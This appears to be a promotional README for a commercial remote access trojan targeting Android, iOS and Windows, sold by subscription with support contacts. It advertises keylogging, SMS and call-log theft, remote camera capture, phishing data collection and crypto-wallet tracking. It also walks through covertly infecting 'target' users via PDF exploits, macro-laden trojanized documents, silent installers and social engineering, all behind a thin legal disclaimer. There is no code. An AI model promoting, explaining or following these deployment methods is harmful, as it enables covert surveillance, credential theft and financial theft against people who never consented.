# Androidrat: Fully-Loaded at [androidrat.online](https://androidrat.online) 📱

A comprehensive remote access and device management tool for Android devices. Control, monitor, and manage target devices from a centralized web-based control panel.

## Overview

Android Rat is a powerful tool designed for security professionals, penetration testers, and device administrators. Once the payload is installed on a target device, you gain complete remote access and control through an intuitive web interface.

## 🚀 Architecture

The framework is built on a microservices-oriented architecture, ensuring high availability and low-latency communication between the controller and managed agents.

- **C2 Server**: Node.js/Socket.io backend handling real-time duplex communication.
- **Web Dashboard**: Next.js/TailwindCSS interface with real-time data visualization.
- **Cross-Platform Agents**: Native implementations for Android (Kotlin), iOS (Swift), and Windows (C#).
- **Custom Protocol**: Optimized binary protocol with HMAC-SHA256 integrity checks.

## 🛠 Tech Stack

| Component | Technology |
|-----------|------------|
| Backend | Node.js, Express, Socket.io, Redis |
| Frontend | React, Next.js, TypeScript, TailwindCSS |
| Database | MongoDB (Persistence), Redis (Caching) |
| Android | Kotlin, Coroutines, Retrofit, WorkManager |
| Windows | .NET 6, C#, Windows Services |
| iOS | Swift, Combine, BackgroundTasks |
| DevOps | Docker, GitHub Actions, Terraform |


## ⚠️ Educational Purpose only.

**IMPORTANT LEGAL NOTICE**: This tool is intended **ONLY** for:
- Authorized security testing and penetration testing
- Educational purposes with explicit consent
- Devices you own or have written authorization to access

**Unauthorized access to computer systems is illegal.** Users are solely responsible for ensuring they have proper authorization before using this tool on any device. Unauthorized installation or use may violate local, state, and federal laws including the Computer Fraud and Abuse Act (CFAA) and similar legislation in other jurisdictions.

By using Android Rat, you agree to use it only for lawful purposes and accept full legal responsibility for your actions.

---

## What It Does

Android Rat provides complete device management and monitoring capabilities:

- **Remote Desktop Access (VNC)** - View and control the device screen in real-time
- **File Management** - Browse, upload, and download files from the target device
- **Application Control** - View installed applications and manage them
- **Communication Monitoring** - Access call logs, SMS messages, and contacts
- **System Information** - Monitor device specs, battery, storage, and performance
- **Multimedia Control** - Access camera, recordings, photos, and media files
- **Device Interaction** - Send SMS, control vibrator, flashlight, and notifications
- **Advanced Features** - Keylogger, clipboard monitoring, text-to-speech, shell commands
- **Security Tools** - Phishing data collection, admin panel access, device spoofing
- **Crypto Monitoring** - Track cryptocurrency wallets and transactions

## Control Panel Interface

### Main Dashboard
The main control panel displays all available features in an intuitive grid layout. Select any feature to access its functionality.

![Control Panel Main Dashboard](<p align="center">
  <a href="https://androidrat.online/">
    <img src="/img/gui.PNG" width="45%" />
  </a>
  <a href="https://androidrat.online/">
    <img src="/img/gui2.PNG" width="45%" />
  </a>
</p>
)

### Feature Access
Once you select a feature, a dedicated interface opens for that specific function. Here's an example of the VNC (Remote Desktop) feature:

![VNC Remote Desktop Session]()

## Payload Installation Methods

Android Rat supports multiple installation methods across different platforms. Choose the method that best suits your target device.

### Android Installation

#### Method 1: Direct APK Installation
1. Build the Android payload from the control panel
2. Transfer the APK file to the target device
3. Enable "Unknown Sources" in device settings (Settings → Security)
4. Open the APK file and tap "Install"
5. Once installed, the device automatically connects to your control panel

#### Method 2: PDF Exploit Installation
1. Generate the PDF exploit payload from the control panel
2. Send the PDF file to the target device via email or messaging
3. When the target opens the PDF, the exploit automatically triggers
4. The payload installs silently in the background
5. Device appears online in your control panel

**Note**: PDF exploit method may require specific Android versions (typically Android 5-11 for optimal compatibility).

---

### iOS Installation

#### Method 1: Profile Installation (MDM)
1. Generate the iOS profile payload
2. Send the profile link to the target device
3. Open Settings → General → VPN & Device Management
4. Tap the profile and select "Install"
5. Confirm the installation when prompted
6. Device connects to control panel automatically

#### Method 2: TestFlight Installation
1. Generate the TestFlight build from the control panel
2. Invite the target user to the TestFlight beta
3. Target user opens TestFlight app and accepts the invitation
4. App installs automatically
5. Device appears in your control panel

#### Method 3: iCloud Installation
1. Generate the iCloud-compatible payload
2. Add the target Apple ID to your iCloud account
3. Use "Find My" or Apple's device management features
4. Payload installs silently through iCloud sync
5. Device connects to control panel

**Note**: iOS methods require different approaches due to Apple's security restrictions. Profile and TestFlight methods are most reliable.

---

### Windows Installation

#### Method 1: Double-Click Executable
1. Generate the Windows executable payload (.exe)
2. Transfer the .exe file to the target computer
3. Double-click the executable file
4. Windows may show a security warning - target user clicks "Run anyway"
5. Payload installs and device appears online in your control panel

#### Method 2: Silent Installation
1. Generate the silent installer variant
2. Use Group Policy or remote execution to run the installer
3. Payload installs without user interaction
4. Device connects automatically

#### Method 3: Trojanized Documents
1. Generate the payload-embedded document (Word, Excel, PDF)
2. Send to target via email
3. When opened, macro/exploit triggers automatically
4. Payload installs in background
5. Device connects to control panel

**Note**: Windows Defender and antivirus may flag the executable. Ensure proper authorization before deployment.

---

## How to Use

### Step 1: Build Your Payload

1. Visit [androidrat.online](https://androidrat.online)
2. Choose your desired plan (Demo/Trial, Lifetime, or Course)
3. Click "Build" in the control panel
4. Select your target platform (Android, iOS, or Windows)
5. Choose your installation method
6. Configure payload settings
7. Generate and download your payload

### Step 2: Deploy the Payload

- **Android**: Transfer APK or send PDF exploit
- **iOS**: Send profile link or TestFlight invitation
- **Windows**: Send executable or trojanized document

### Step 3: Monitor and Control

1. Once installed, the device appears in your control panel
2. Select the device from the device list
3. Choose the feature you want to use
4. Execute commands in real-time
5. Monitor device activity and data

### Basic Operations

- **Select Device** - Choose from your list of connected online devices
- **Monitor Status** - Check device connectivity, ping, and online status
- **Execute Commands** - Use any of the available features from the control panel
- **Real-time Sync** - All changes are reflected in real-time across connected devices

## Features Breakdown

| Feature | Description |
|---------|-------------|
| **VNC** | Remote desktop viewing and control with adjustable resolution |
| **File Manager** | Full file system access and file transfer |
| **Call Logs** | View complete call history |
| **Contacts** | Access and manage device contacts |
| **SMS Control** | Send SMS messages from the device |
| **Shell Access** | Execute terminal commands on the device |
| **Keylogger** | Monitor keyboard input |
| **Camera** | Capture photos and record videos remotely |
| **Recordings** | Access device audio and video recordings |
| **Clipboard** | Monitor clipboard content |
| **System Info** | View detailed device specifications |
| **App Management** | List and control installed applications |

## System Requirements

- **Target Device**: Android 5.0+, iOS 12+, Windows 7+
- **Control Panel Access**: Modern web browser (Chrome, Firefox, Safari, Edge)
- **Internet Connection**: Required for remote access
- **Authorization**: Proper authorization required for all target devices

## Getting Started

1. Visit [androidrat.online](https://androidrat.online)
2. Choose your desired plan (Demo/Trial, Lifetime, or Course)
3. Select your target platform and installation method
4. Build your customized payload
5. Deploy to target device
6. Start managing your devices from the control panel

## Support & Contact

For questions, support, or inquiries:

- **Telegram**: [@jrram3000](https://t.me/jrram3000)
- **Email**: esplaysbgmi@gmail.com
- **Website**: [androidrat.online](https://androidrat.online)

## 📊 Project Statistics

Views counter enabled on **19 Oct 2024 Sat**

[![Androidrat profile views](https://u8views.com/api/v1/github/profiles/150267024/views/day-week-month-total-count.svg)](https://u8views.com/github/ES-UNIVERSE)

## Legal Disclaimer

This tool is provided for authorized security testing, penetration testing, and legitimate device management purposes only. 

**Users are solely responsible for:**
- Obtaining proper authorization before using this tool on any device
- Complying with all applicable laws and regulations
- Understanding that unauthorized access is illegal
- Any consequences resulting from misuse of this tool

Unauthorized access to computer systems is illegal and may result in criminal charges. By using Android Rat, you acknowledge that you have read this disclaimer and agree to use the tool only for lawful purposes.

## License

All rights reserved. For licensing information, visit [androidrat.online](https://androidrat.online)

---

**Android Rat** - Professional Device Management & Remote Access Tool
